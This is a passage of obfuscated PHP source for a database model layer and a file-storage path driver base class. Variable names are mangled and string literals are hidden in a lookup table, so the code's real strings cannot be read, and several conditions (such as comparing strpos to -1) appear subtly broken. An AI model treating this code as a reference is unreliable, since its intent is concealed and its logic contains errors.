$œéè¸ÅÕ[50])) { list($ŒÚş‹Á, $ˆÓâŠË‰) = explode($œéè¸ÅÕ[50], $æÏ£‹); return $—ñå Òô >= $ŒÚş‹Á && $—ñå Òô <= $ˆÓâŠË‰; } else { return $—ñå Òô == $æÏ£‹; } case $œéè¸ÅÕ[425]: list($‚çÎÓÖ¾, $ÍÆ›­) = explode($œéè¸ÅÕ[50], $æÏ£‹); if (!is_numeric($‚çÎÓÖ¾)) { $‚çÎÓÖ¾ = strtotime($‚çÎÓÖ¾); } if (!is_numeric($ÍÆ›­)) { $ÍÆ›­ = strtotime($ÍÆ›­); } return NOW_TIME >= $‚çÎÓÖ¾ && NOW_TIME <= $ÍÆ›­; case $œéè¸ÅÕ[426]: return in_array(get_client_ip(), explode($œéè¸ÅÕ[50], $æÏ£‹)); case $œéè¸ÅÕ[427]: return !in_array(get_client_ip(), explode($œéè¸ÅÕ[50], $æÏ£‹)); case $œéè¸ÅÕ[414]: default: return $this->regex($Ê¡”¼„ê, $æÏ£‹); } } public function query($¿«ƒÔ‚, $Ğ”ô®ÎĞ = false) { $ÃˆÚ¼™à =& $_SERVER[äô®•½Â]; if (!is_bool($Ğ”ô®ÎĞ) && !is_array($Ğ”ô®ÎĞ)) { $Ğ”ô®ÎĞ = func_get_args(); array_shift($Ğ”ô®ÎĞ); } $¿«ƒÔ‚ = str_replace(array($ÃˆÚ¼™à[288], $ÃˆÚ¼™à[428]), $ÃˆÚ¼™à[53], $¿«ƒÔ‚); $¿«ƒÔ‚ = $this->parseSql($¿«ƒÔ‚, $Ğ”ô®ÎĞ); return $this->db->query($¿«ƒÔ‚); } public function execute($ñ±€åà, $¥¾‚†øá = false) { if (!is_bool($¥¾‚†øá) && !is_array($¥¾‚†øá)) { $¥¾‚†øá = func_get_args(); array_shift($¥¾‚†øá); } $ñ±€åà = $this->parseSql($ñ±€åà, $¥¾‚†øá); return $this->db->execute($ñ±€åà); } protected function parseSql($‡Ù„ŠØ, $Âë••Ë) { $•Æ»İê =& $_SERVER[äô®•½Â]; if (!0 === $Âë••Ë) { $ä•ò‰Ê = $this->_parseOptions(); $‡Ù„ŠØ = $this->db->parseSql($‡Ù„ŠØ, $ä•ò‰Ê); } elseif (is_array($Âë••Ë)) { $Âë••Ë = array_map(array($this->db, $•Æ»İê[429]), $Âë••Ë); $‡Ù„ŠØ = vsprintf($‡Ù„ŠØ, $Âë••Ë); } else { $‡Ù„ŠØ = strtr($‡Ù„ŠØ, array($•Æ»İê[430] => $this->getTableName(), $•Æ»İê[431] => think_config($•Æ»İê[333]))); } $this->db->setModel($this->name); return $‡Ù„ŠØ; } public function db($¯ËËşå = '', $é©„ùòÓ = '', $îöŒæšø = array()) { $şœÄ½Åš =& $_SERVER[äô®•½Â]; if ($şœÄ½Åš[12] === $¯ËËşå && $this->db) { return $this->db; } static $¦ÕéÔöÎ = array(); static $ŠÁ÷±Ú = array(); if (!isset($ŠÁ÷±Ú[$¯ËËşå]) || isset($ŠÁ÷±Ú[$¯ËËşå]) && $é©„ùòÓ && $¦ÕéÔöÎ[$¯ËËşå] != $é©„ùòÓ) { if (!empty($é©„ùòÓ) && is_string($é©„ùòÓ) && !1 === strpos($é©„ùòÓ, $şœÄ½Åš[8])) { $é©„ùòÓ = think_config($é©„ùòÓ); } $¯ËËşå = think_guid($é©„ùòÓ); $ŠÁ÷±Ú[$¯ËËşå] = Db::getInstance($é©„ùòÓ); } elseif (NULL === $é©„ùòÓ) { $ŠÁ÷±Ú[$¯ËËşå]->close(); unset($ŠÁ÷±Ú[$¯ËËşå]); return; } if (!empty($îöŒæšø)) { if (is_string($îöŒæšø)) { parse_str($îöŒæšø, $îöŒæšø); } foreach ($îöŒæšø as $Ş‹›ÜßÖ => $…´“Ş¾á) { $this->setProperty($Ş‹›ÜßÖ, $…´“Ş¾á); } } $¦ÕéÔöÎ[$¯ËËşå] = $é©„ùòÓ; $this->db = $ŠÁ÷±Ú[$¯ËËşå]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $’Ô±ñÜÉ = get_class($this); if ($’Ô±ñÜÉ == $_SERVER[äô®•½Â][432]) { return $this->name; } $this->name = substr($’Ô±ñÜÉ, 0, -5); } return $this->name; } public function getTableName() { $±êİ—”Õ =& $_SERVER[äô®•½Â]; if (empty($this->trueTableName)) { $•òœõø = !empty($this->tablePrefix) ? $this->tablePrefix : $±êİ—”Õ[12]; if (!empty($this->tableName)) { $•òœõø .= $this->tableName; } else { $•òœõø .= think_parse_name($this->name); } $this->trueTableName = strtolower($•òœõø); } return (!empty($this->dbName) ? $this->dbName . $±êİ—”Õ[10] : $±êİ—”Õ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $îòË» =& $_SERVER[äô®•½Â]; return isset($this->fields[$îòË»[340]]) ? $this->fields[$îòË»[340]] : $this->pk; } public function getDbFields() { $Á¨ûÍ°ù =& $_SERVER[äô®•½Â]; if (isset($this->options[$Á¨ûÍ°ù[368]])) { $ûí¤Ï = $this->db->getFields($this->options[$Á¨ûÍ°ù[368]]); return $ûí¤Ï ? array_keys($ûí¤Ï) : !1; } if ($this->fields) { $ûí¤Ï = $this->fields; unset($ûí¤Ï[$Á¨ûÍ°ù[339]], $ûí¤Ï[$Á¨ûÍ°ù[340]], $ûí¤Ï[$Á¨ûÍ°ù[341]], $ûí¤Ï[$Á¨ûÍ°ù[338]]); return $ûí¤Ï; } return !1; } public function data($–¯¶ïî = '') { $Ú¥–„¶õ =& $_SERVER[äô®•½Â]; if ($Ú¥–„¶õ[12] === $–¯¶ïî && !empty($this->data)) { return $this->data; } if (is_object($–¯¶ïî)) { $–¯¶ïî = get_object_vars($–¯¶ïî); } elseif (is_string($–¯¶ïî)) { parse_str($–¯¶ïî, $–¯¶ïî); } elseif (!is_array($–¯¶ïî)) { think_exception(think_lang($Ú¥–„¶õ[360])); } $this->data = $–¯¶ïî; return $this; } public function join($úéƒÂ¤‰) { $€úˆ’‚ =& $_SERVER[äô®•½Â]; if (is_array($úéƒÂ¤‰)) { $this->options[$€úˆ’‚[371]] = $úéƒÂ¤‰; } elseif (!empty($úéƒÂ¤‰)) { $this->options[$€úˆ’‚[371]][] = $úéƒÂ¤‰; } return $this; } public function union($¼…™·Í„, $³°»·±Å = false) { $àî‰•‚ =& $_SERVER[äô®•½Â]; if (empty($¼…™·Í„)) { return $this; } if ($³°»·±Å) { $this->options[$àî‰•‚[433]][$àî‰•‚[434]] = !0; } if (is_object($¼…™·Í„)) { $¼…™·Í„ = get_object_vars($¼…™·Í„); } if (is_string($¼…™·Í„)) { $’Ê—‡ü = $¼…™·Í„; } elseif (is_array($¼…™·Í„)) { if (isset($¼…™·Í„[0])) { $this->options[$àî‰•‚[433]] = array_merge($this->options[$àî‰•‚[433]], $¼…™·Í„); return $this; } else { $’Ê—‡ü = $¼…™·Í„; } } else { think_exception(think_lang($àî‰•‚[360])); } $this->options[$àî‰•‚[433]][] = $’Ê—‡ü; return $this; } public function cache($¤Üá–¢ = true, $—‹ßÕËº = null, $ÂÙ•İ‹‚ = '') { $éòä©„× =& $_SERVER[äô®•½Â]; if (!1 !== $¤Üá–¢) { $this->options[$éòä©„×[435]] = array($éòä©„×[97] => $¤Üá–¢, $éòä©„×[425] => $—‹ßÕËº, $éòä©„×[33] => $ÂÙ•İ‹‚); } return $this; } public function field($” ‡˜·¸, $ªÓ®àÆÎ = false) { $ù§±®¼Ü =& $_SERVER[äô®•½Â]; if (!0 === $” ‡˜·¸) { $ ïƒêÂõ = $this->getDbFields(); $” ‡˜·¸ = $ ïƒêÂõ ? $ ïƒêÂõ : $ù§±®¼Ü[223]; } elseif ($ªÓ®àÆÎ) { if (is_string($” ‡˜·¸)) { $” ‡˜·¸ = explode($ù§±®¼Ü[50], $” ‡˜·¸); } $ ïƒêÂõ = $this->getDbFields(); $” ‡˜·¸ = $ ïƒêÂõ ? array_diff($ ïƒêÂõ, $” ‡˜·¸) : $” ‡˜·¸; } $this->options[$ù§±®¼Ü[362]] = $” ‡˜·¸; return $this; } public function scope($ÃÎ¼Ò—Ã = '', $ñ©ñû¿ = NULL) { $Àşá¿Ùö =& $_SERVER[äô®•½Â]; if ($Àşá¿Ùö[12] === $ÃÎ¼Ò—Ã) { if (isset($this->_scope[$Àşá¿Ùö[37]])) { $ğõäÁÄı = $this->_scope[$Àşá¿Ùö[37]]; } else { return $this; } } elseif (is_string($ÃÎ¼Ò—Ã)) { $ëúóÂĞ = explode($Àşá¿Ùö[50], $ÃÎ¼Ò—Ã); $ğõäÁÄı = array(); foreach ($ëúóÂĞ as $ä­²¯ñŞ) { if (!isset($this->_scope[$ä­²¯ñŞ])) { continue; } $ğõäÁÄı = array_merge($ğõäÁÄı, $this->_scope[$ä­²¯ñŞ]); } if (!empty($ñ©ñû¿) && is_array($ñ©ñû¿)) { $ğõäÁÄı = array_merge($ğõäÁÄı, $ñ©ñû¿); } } elseif (is_array($ÃÎ¼Ò—Ã)) { $ğõäÁÄı = $ÃÎ¼Ò—Ã; } if (is_array($ğõäÁÄı) && !empty($ğõäÁÄı)) { $this->options = array_merge($this->options, array_change_key_case($ğõäÁÄı)); } return $this; } public function where($ê§…­ıÎ, $Å×Ş±›¿ = null) { $Á½¢”¿Î =& $_SERVER[äô®•½Â]; if (!is_null($Å×Ş±›¿) && is_string($ê§…­ıÎ)) { if (!is_array($Å×Ş±›¿)) { $Å×Ş±›¿ = func_get_args(); array_shift($Å×Ş±›¿); } $Å×Ş±›¿ = array_map(array($this->db, $Á½¢”¿Î[429]), $Å×Ş±›¿); $ê§…­ıÎ = vsprintf($ê§…­ıÎ, $Å×Ş±›¿); } elseif (is_object($ê§…­ıÎ)) { $ê§…­ıÎ = get_object_vars($ê§…­ıÎ); } elseif (is_array($ê§…­ıÎ)) { foreach ($ê§…­ıÎ as $©Ç÷‚‹ƒ => $»ò’òÂ) { if ((is_numeric($©Ç÷‚‹ƒ) || !$©Ç÷‚‹ƒ) && is_string($»ò’òÂ)) { if (strpos($»ò’òÂ, $Á½¢”¿Î[436]) === 0) { continue; } think_trace($Á½¢”¿Î[437], $Á½¢”¿Î[12], $Á½¢”¿Î[49]); die; } } } if (is_string($ê§…­ıÎ) && $Á½¢”¿Î[12] != $ê§…­ıÎ) { $’²¬Ìøá = array(); $’²¬Ìøá[$Á½¢”¿Î[438]] = $ê§…­ıÎ; $ê§…­ıÎ = $’²¬Ìøá; } if (isset($this->options[$Á½¢”¿Î[364]])) { $this->options[$Á½¢”¿Î[364]] = array_merge($this->options[$Á½¢”¿Î[364]], $ê§…­ıÎ); } else { $this->options[$Á½¢”¿Î[364]] = $ê§…­ıÎ; } return $this; } public function limit($ØäÜÔ÷à, $£ğËı­Ğ = null) { $¡Ùí’äÍ =& $_SERVER[äô®•½Â]; $this->options[$¡Ùí’äÍ[379]] = is_null($£ğËı­Ğ) ? $ØäÜÔ÷à : $ØäÜÔ÷à . $¡Ùí’äÍ[50] . $£ğËı­Ğ; return $this; } public function page($¿ÇÓÜê¤, $‰ëÃü¼¤ = null) { $ë®Âºå‰ =& $_SERVER[äô®•½Â]; $this->options[$ë®Âºå‰[439]] = is_null($‰ëÃü¼¤) ? $¿ÇÓÜê¤ : $¿ÇÓÜê¤ . $ë®Âºå‰[50] . $‰ëÃü¼¤; return $this; } public function comment($„„¥Íşú) { $this->options[$_SERVER[äô®•½Â][440]] = $„„¥Íşú; return $this; } public function setProperty($ûåªÎÜï, $ßóË—ş˜) { if (property_exists($this, $ûåªÎÜï)) { $this->{$ûåªÎÜï} = $ßóË—ş˜; } return $this; } } goto F×î¤ùÈ; BŒàØÉ÷®¸: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ÔÀ¯‘ñí =& $_SERVER[äô®•½Â]; $this->objectDriver = array($ÔÀ¯‘ñí[60], $ÔÀ¯‘ñí[61], $ÔÀ¯‘ñí[62], $ÔÀ¯‘ñí[63], $ÔÀ¯‘ñí[64], $ÔÀ¯‘ñí[65], $ÔÀ¯‘ñí[66], $ÔÀ¯‘ñí[67], $ÔÀ¯‘ñí[68], $ÔÀ¯‘ñí[69], $ÔÀ¯‘ñí[70], $ÔÀ¯‘ñí[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($˜ˆõ·á) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($˜ˆõ·á, $_SERVER[äô®•½Â][8]); } return $˜ˆõ·á; } public function iconvApp($·ëÉš) { return $·ëÉš; } public function iconvSystem($Í“åØ”Ô) { return $Í“åØ”Ô; } public function iconvTo($¼Î²£Ïğ, $î—Ù°Ÿ¡, $×öùğ†Š) { $Âö¯°½ê =& $_SERVER[äô®•½Â]; if (!$¼Î²£Ïğ || !function_exists($Âö¯°½ê[72])) { return $¼Î²£Ïğ; } static $¶ï¦ĞÆÃ = array(); $ØçÙ¡Ìç = $î—Ù°Ÿ¡ . $Âö¯°½ê[73] . $×öùğ†Š . $Âö¯°½ê[74] . $¼Î²£Ïğ; if (isset($¶ï¦ĞÆÃ[$ØçÙ¡Ìç])) { return $¶ï¦ĞÆÃ[$ØçÙ¡Ìç]; } if (function_exists($Âö¯°½ê[75])) { $º¿Üú = @mb_convert_encoding($¼Î²£Ïğ, $×öùğ†Š, $î—Ù°Ÿ¡); } else { $º¿Üú = @iconv($î—Ù°Ÿ¡, $×öùğ†Š, $¼Î²£Ïğ); } $º¿Üú = $º¿Üú ? $º¿Üú : $¼Î²£Ïğ; if (strstr($º¿Üú, $Âö¯°½ê[76])) { $º¿Üú = str_replace($Âö¯°½ê[76], $Âö¯°½ê[11], $º¿Üú); } $¶ï¦ĞÆÃ[$î—Ù°Ÿ¡ . $Âö¯°½ê[73] . $×öùğ†Š . $Âö¯°½ê[74] . $¼Î²£Ïğ] = $º¿Üú; $¶ï¦ĞÆÃ[$×öùğ†Š . $Âö¯°½ê[73] . $î—Ù°Ÿ¡ . $Âö¯°½ê[74] . $¼Î²£Ïğ] = $¼Î²£Ïğ; $¶ï¦ĞÆÃ[$×öùğ†Š . $Âö¯°½ê[73] . $î—Ù°Ÿ¡ . $Âö¯°½ê[74] . $º¿Üú] = $¼Î²£Ïğ; $¶ï¦ĞÆÃ[$î—Ù°Ÿ¡ . $Âö¯°½ê[73] . $×öùğ†Š . $Âö¯°½ê[74] . $º¿Üú] = $º¿Üú; return $º¿Üú; } public function getPathInner($™¦÷’ƒ”) { $ûê¡ĞÎ° = IO::init($™¦÷’ƒ”); return $ûê¡ĞÎ°->path; } public function getPathOuter($úÃ‰åæ‰) { $†¤ëÊ£Å =& $_SERVER[äô®•½Â]; $Ìùª¡Úª = strlen(trim($this->pathBase, $†¤ëÊ£Å[8])); $úÃ‰åæ‰ = substr(trim($úÃ‰åæ‰, $†¤ëÊ£Å[8]), $Ìùª¡Úª); return $this->pathDriver . $†¤ëÊ£Å[8] . ltrim($úÃ‰åæ‰, $†¤ëÊ£Å[8]); } public function isParentOf($Ô”ãÍ¾ñ, $šº§Ìõ) { $¹¯„ƒ˜Ì =& $_SERVER[äô®•½Â]; $Ô”ãÍ¾ñ = rtrim(strtolower($Ô”ãÍ¾ñ), $¹¯„ƒ˜Ì[8]) . $¹¯„ƒ˜Ì[8]; $šº§Ìõ = rtrim(strtolower($šº§Ìõ), $¹¯„ƒ˜Ì[8]) . $¹¯„ƒ˜Ì[8]; $Â†Ôñ¿Ä = strpos($šº§Ìõ, $Ô”ãÍ¾ñ) === 0; return $Â†Ôñ¿Ä; } public function getType() { $ó‘Âòñ­ =& $_SERVER[äô®•½Â]; $Ê¶ù‚Ì¢ = str_replace($ó‘Âòñ­[77], $ó‘Âòñ­[12], get_class($this)); return strtolower($Ê¶ù‚Ì¢); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ ¹¬ğç, $ËÇğ‹¿Ï) { $Ùú¬¶Á‘ =& $_SERVER[äô®•½Â]; $òğ×òë… = rtrim($ ¹¬ğç, $Ùú¬¶Á‘[8]) . $Ùú¬¶Á‘[8] . $ËÇğ‹¿Ï; $•ô°‰‡Ÿ = $this->exist($òğ×òë…); return $•ô°‰‡Ÿ ? $òğ×òë… : !1; } public function setModifyTime($’Ú’ŸåÃ, $í ™¼Š½ = '') { } public function renameObject($ñŸé‚­, $Â“¼«“Ã) { $…½ªØ¿ = $Â“¼«“Ã; $ñŸé‚­ = $this->getPathOuter($ñŸé‚­); $Â“¼«“Ã = $this->pathFather($ñŸé‚­) . $Â“¼«“Ã; $‹ßâ­¡Ê = IO::copy($ñŸé‚­, $this->pathFather($ñŸé‚­), REPEAT_RENAME_FOLDER, $…½ªØ¿); if ($‹ßâ­¡Ê) { IO::remove($ñŸé‚­); } return $‹ßâ­¡Ê ? $Â“¼«“Ã : !1; } public function tempFile($Ñ¶Øˆè¤ = '', $ÛÂŸÖÅÈ = '') { if (!$Ñ¶Øˆè¤) { $Ñ¶Øˆè¤ = rand_string(15); } $Ğ£‰Ëœ½ = TEMP_FILES . rand_string(15) . $_SERVER[äô®•½Â][8]; @mkdir($Ğ£‰Ëœ½, DEFAULT_PERRMISSIONS, !0); $ˆ¤¡°±÷ = $Ğ£‰Ëœ½ . $Ñ¶Øˆè¤; @touch($ˆ¤¡°±÷); if ($ÛÂŸÖÅÈ) { file_put_contents($ˆ¤¡°±÷, $ÛÂŸÖÅÈ); } return $ˆ¤¡°±÷; } public function tempFileRemve($„ÙÖü½) { @unlink($„ÙÖü½); @rmdir($this->pathFather($„ÙÖü½)); } public function mkfile($±—éöô, $ˆ£ĞŞÑ = '', $»ÊìÜ¯œ = REPEAT_RENAME) { } public function mkdir($ÅıìĞŞÒ, $šÎ•¤ = REPEAT_SKIP) { } public function delFile($¯á«Á¤Ù) { } public function delFolder($²¢ Â‘ã) { } public function copyFile($æ…Ì¦¯Œ, $ Ò·È£ì) { } public function moveFile($‰¿Ü¸ó‘, $îã¨¥€) { } public function remove($Âóâ¢ğ) { if ($this->isFile($Âóâ¢ğ)) { return $this->delFile($Âóâ¢ğ); } return $this->delFolder($Âóâ¢ğ); } public function rename($ƒ—·É¤Š, $íéäŞš) { } public function exist($ÚËï³Œ„) { } public function findByHash($ëŒÀí… = '', $ÏŸ£º¼ = '') { return !1; } public function isFile($ñÈŞ•ğ‰) { } public function isFolder($À ¨ÜÙ˜) { } public function size($éèú³™“) { } public function info($™„û¤­) { } public function infoSimple($­åıÖÒŠ) { return $this->info($­åıÖÒŠ); } public function infoAuth($÷»ß„Íó) { return $this->info($÷»ß„Íó); } public function infoFull($ıëí£¨ì) { return $this->info($ıëí£¨ì); } public function infoFullSimple($¥¨Šß¥…) { return $this->info($¥¨Šß¥…); } public function infoWithChildren($¢÷ùÉª) { $áíı£ë =& $_SERVER[äô®•½Â]; static $ÊÌ½õÔ² = array(); if (isset($ÊÌ½õÔ²[$¢÷ùÉª])) { return $ÊÌ½õÔ²[$¢÷ùÉª]; } $ÅŞ˜¿à = $this->info($¢÷ùÉª); if ($ÅŞ˜¿à && $ÅŞ˜¿à[$áíı£ë[33]] == $áíı£ë[78]) { $Â­¦×¤¬ = array($áíı£ë[79] => 0, $áíı£ë[80] => 0, $áíı£ë[81] => 0); $this->infoChildren($¢÷ùÉª, $Â­¦×¤¬); $ÅŞ˜¿à[$áíı£ë[79]] = $Â­¦×¤¬[$áíı£ë[79]]; $ÅŞ˜¿à[$áíı£ë[82]] = array($áíı£ë[83] => $Â­¦×¤¬[$áíı£ë[80]], $áíı£ë[84] => $Â­¦×¤¬[$áíı£ë[81]]); $ÊÌ½õÔ²[$¢÷ùÉª] = $ÅŞ˜¿à; } return $ÅŞ˜¿à; } public function listPath($üÆ‹ä‰ , $Ä™üáÏ = false) { } public function has($¦äë¥³, $ñ¸íå•§ = false, $½Ú¦òè = false) { } public function canRead($‰Ù²¹‰ì) { } public function canWrite($ßŒ¾íÉ÷) { } public function getContent($É´Õœ¨Ä) { } public function setContent($¤¡Ôñî, $øƒ¡ÑÙ™ = '') { } protected function infoChildren($…¥²²È‹, &$™İ³ÎÓŸ) { $Á†ë¤¥» =& $_SERVER[äô®•½Â]; check_abort_echo(); $É·œşñ‰ = $this->listPath($…¥²²È‹, !0); $É·œşñ‰ = array_merge($É·œşñ‰[$Á†ë¤¥»[85]], $É·œşñ‰[$Á†ë¤¥»[86]]); foreach ($É·œşñ‰ as $µ¤Ü‰¶ã) { if ($µ¤Ü‰¶ã[$Á†ë¤¥»[33]] == $Á†ë¤¥»[78]) { $™İ³ÎÓŸ[$Á†ë¤¥»[81]]++; $«­šÛø = $this->getPathInner($µ¤Ü‰¶ã[$Á†ë¤¥»[87]]); $this->infoChildren($«­šÛø, $™İ³ÎÓŸ); } else { $™İ³ÎÓŸ[$Á†ë¤¥»[80]]++; $™İ³ÎÓŸ[$Á†ë¤¥»[79]] += $µ¤Ü‰¶ã[$Á†ë¤¥»[79]]; } } } public function fileSubstr($·şàà·, $Öæ„È‡, $î´•§¸è) { } public function listAll($€Ë¿Ö±‰) { } public function listAllMake($®®¢öñı, &$ı°Â¸É) { $è™€Õ×Â =& $_SERVER[äô®•½Â]; check_abort_echo(); $Şš–šü¨ = $this->listPath($®®¢öñı, !0); if (!$Şš–šü¨) { return; } $ĞµèÒ›± = array_merge($Şš–šü¨[$è™€Õ×Â[85]], $Şš–šü¨[$è™€Õ×Â[86]]); foreach ($ĞµèÒ›± as $¹ãœ•şÅ) { $ùŒÖ³ÕÎ = $¹ãœ•şÅ[$è™€Õ×Â[33]] == $è™€Õ×Â[78]; $ÙàæÃ¬§ = array($è™€Õ×Â[87] => $¹ãœ•şÅ[$è™€Õ×Â[87]], $è™€Õ×Â[78] => $ùŒÖ³ÕÎ); if (isset($¹ãœ•şÅ[$è™€Õ×Â[79]])) { $ÙàæÃ¬§[$è™€Õ×Â[79]] = $¹ãœ•şÅ[$è™€Õ×Â[79]]; } if (isset($¹ãœ•şÅ[$è™€Õ×Â[88]])) { $ÙàæÃ¬§[$è™€Õ×Â[88]] = $¹ãœ•şÅ[$è™€Õ×Â[88]]; } if (!$ùŒÖ³ÕÎ) { $ı°Â¸É[] = $ÙàæÃ¬§; continue; } $ı°Â¸É[] = $ÙàæÃ¬§; $Ûİ±¾¤÷ = $¹ãœ•şÅ[$è™€Õ×Â[87]]; $í–Õ¿¾“ = $this->pathDriver; if (substr($¹ãœ•şÅ[$è™€Õ×Â[87]], 0, strlen($í–Õ¿¾“)) == $í–Õ¿¾“) { $Ûİ±¾¤÷ = substr($Ûİ±¾¤÷, strlen($í–Õ¿¾“)); } $this->listAllMake($Ûİ±¾¤÷, $ı°Â¸É); } } public function listAllSimple($Ï´¿¬ìù, $Ëî‰‹óÈ = false) { $ÌÂ×ë = $this->listAll($Ï´¿¬ìù); return $this->listAllSimpleMake($ÌÂ×ë, $this->getPathOuter($Ï´¿¬ìù), $Ëî‰‹óÈ); } public function listAllSimpleMake($•¿˜„Á», $°“…Ğ×¹, $ş¸Ûï†) { $¥™®©Ñ­ =& $_SERVER[äô®•½Â]; $Ä¯Öäº = array(); $°“…Ğ×¹ = rtrim(get_path_father($°“…Ğ×¹), $¥™®©Ñ­[8]) . $¥™®©Ñ­[8]; foreach ($•¿˜„Á» as $óŠ¸²¦Ñ) { $ÏßşœĞ = array($¥™®©Ñ­[87] => $óŠ¸²¦Ñ[$¥™®©Ñ­[87]], $¥™®©Ñ­[89] => $óŠ¸²¦Ñ[$¥™®©Ñ­[87]], $¥™®©Ñ­[78] => $óŠ¸²¦Ñ[$¥™®©Ñ­[78]]); if (isset($óŠ¸²¦Ñ[$¥™®©Ñ­[79]]) && !$óŠ¸²¦Ñ[$¥™®©Ñ­[78]]) { $ÏßşœĞ[$¥™®©Ñ­[79]] = $óŠ¸²¦Ñ[$¥™®©Ñ­[79]]; } if (isset($óŠ¸²¦Ñ[$¥™®©Ñ­[88]])) { $ÏßşœĞ[$¥™®©Ñ­[88]] = $óŠ¸²¦Ñ[$¥™®©Ñ­[88]]; } if (is_array($óŠ¸²¦Ñ[$¥™®©Ñ­[90]])) { $ÏßşœĞ[$¥™®©Ñ­[89]] = $óŠ¸²¦Ñ[$¥™®©Ñ­[90]][$¥™®©Ñ­[87]]; $ÏßşœĞ[$¥™®©Ñ­[79]] = $óŠ¸²¦Ñ[$¥™®©Ñ­[90]][$¥™®©Ñ­[79]]; $ÏßşœĞ[$¥™®©Ñ­[88]] = $óŠ¸²¦Ñ[$¥™®©Ñ­[90]][$¥™®©Ñ­[88]]; } else { if (substr($óŠ¸²¦Ñ[$¥™®©Ñ­[87]], 0, strlen($°“…Ğ×¹)) == $°“…Ğ×¹) { $ÏßşœĞ[$¥™®©Ñ­[87]] = substr($óŠ¸²¦Ñ[$¥™®©Ñ­[87]], strlen($°“…Ğ×¹)); } } $ªı—Šö = $óŠ¸²¦Ñ[$¥™®©Ñ­[78]] ? $¥™®©Ñ­[8] : $¥™®©Ñ­[12]; $ÏßşœĞ[$¥™®©Ñ­[89]] = rtrim($ÏßşœĞ[$¥™®©Ñ­[89]], $¥™®©Ñ­[8]) . $ªı—Šö; $ÏßşœĞ[$¥™®©Ñ­[87]] = $¥™®©Ñ­[8] . trim($ÏßşœĞ[$¥™®©Ñ­[87]], $¥™®©Ñ­[8]) . $ªı—Šö; if (!$ş¸Ûï†) { $Ã²ÏÑØ = explode($¥™®©Ñ­[8], trim($ÏßşœĞ[$¥™®©Ñ­[87]], $¥™®©Ñ­[8])); $ÏßşœĞ[$¥™®©Ñ­[87]] = $¥™®©Ñ­[8] . implode($¥™®©Ñ­[8], array_slice($Ã²ÏÑØ, 1)) . $ªı—Šö; } $Ä¯Öäº[] = $ÏßşœĞ; } return array_sort_by($Ä¯Öäº, $¥™®©Ñ­[87]); } public function upload($úäÂ†üƒ, $†’Úğ™Í, $Ì“İ“Á¼ = false, $ö˜ŸÒğÉ = REPEAT_REPLACE) { } public function uploadFileByID($°åÆ¤Ï¸, $•ãë‘Œ, $±èğ¯ÔĞ) { } public function uploadFileByPath($Ãó ÖÀ†, $ùàŸËı‡, $‡ê•˜èÓ = array()) { } public function isUploadServer() { $¶®¬íÃ =& $_SERVER[äô®•½Â]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¶®¬íÃ[91]) { return !0; } return $GLOBALS[$¶®¬íÃ[6]][$¶®¬íÃ[92]][$¶®¬íÃ[93]]; } public function isFileOutServer() { $ğ’¾«Õç =& $_SERVER[äô®•½Â]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ğ’¾«Õç[91]) { return !0; } return $GLOBALS[$ğ’¾«Õç[6]][$ğ’¾«Õç[92]][$ğ’¾«Õç[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($™Çç‰¯) { $Ò”³¾¾ =& $_SERVER[äô®•½Â]; if (!$this->isCdnHost()) { return $™Çç‰¯; } return str_replace(trim(get_url_root($™Çç‰¯), $Ò”³¾¾[8]), trim($this->cdnHost, $Ò”³¾¾[8]), $™Çç‰¯); } public function uploadLink($•ÒòİûÕ, $ µúğó­ = 0) { $‚¢Îå· =& $_SERVER[äô®•½Â]; if ($this->isUploadServer()) { return; } $Å¡¡¨™™ = $this->getType(); if (!in_array($Å¡¡¨™™, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ ¾î¯°í = 1024 * 1024 * 10; $ ÕŞ»´• = $ µúğó­ <= $ ¾î¯°í ? $‚¢Îå·[95] : $‚¢Îå·[96]; $¨ÌàŒÇ‘ = (!$ µúğó­ ? 1 : ceil($ µúğó­ / pow(1024, 3))) * 3600 * 4; $¼¡ÓÑÜä = $this->{$ ÕŞ»´•}($•ÒòİûÕ, $¨ÌàŒÇ‘); if ($¼¡ÓÑÜä) { $¼¡ÓÑÜä[$‚¢Îå·[97]] = $•ÒòİûÕ; $¼¡ÓÑÜä[$‚¢Îå·[98]] = $Å¡¡¨™™; } return $¼¡ÓÑÜä; } public function uploadFormData($±ˆè•à, $®­‰±œÁ = 3600) { } public function uploadMultiData($ÂÌÃ¤ù¿, $üæ®íşı = 3600) { } public function multiUploadFormData($ØÎ­¡í¸, $€‡Éô‚  = 3600) { return $this->uploadMultiData($ØÎ­¡í¸, $€‡Éô‚ ); } public function download($ıØª¼šı, $ÚÅÚšñ ) { } public function ext($—öÇè) { $¼Ááœ©å =& $_SERVER[äô®•½Â]; if (strpos($—öÇè, $¼Ááœ©å[8]) === -1) { $‡¡³é¢„ = $—öÇè; } else { $‡¡³é¢„ = $this->pathThis($—öÇè); } $½…±Ú¼´ = $¼Ááœ©å[12]; if (strstr($‡¡³é¢„, $¼Ááœ©å[10])) { $½…±Ú¼´ = substr($‡¡³é¢„, strrpos($‡¡³é¢„, $¼Ááœ©å[10]) + 1); $½…±Ú¼´ = strtolower($½…±Ú¼´); } if (strlen($½…±Ú¼´) > 3 && preg_match($¼Ááœ©å[99], $½…±Ú¼´, $ÄôŸè±ú)) { $½…±Ú¼´ = $¼Ááœ©å[12]; } return $½…±Ú¼´; } public function pathThis($Î¹ãË‘) { $‚Äöè =& $_SERVER[äô®•½Â]; $Î¹ãË‘ = str_replace($‚Äöè[100], $‚Äöè[8], 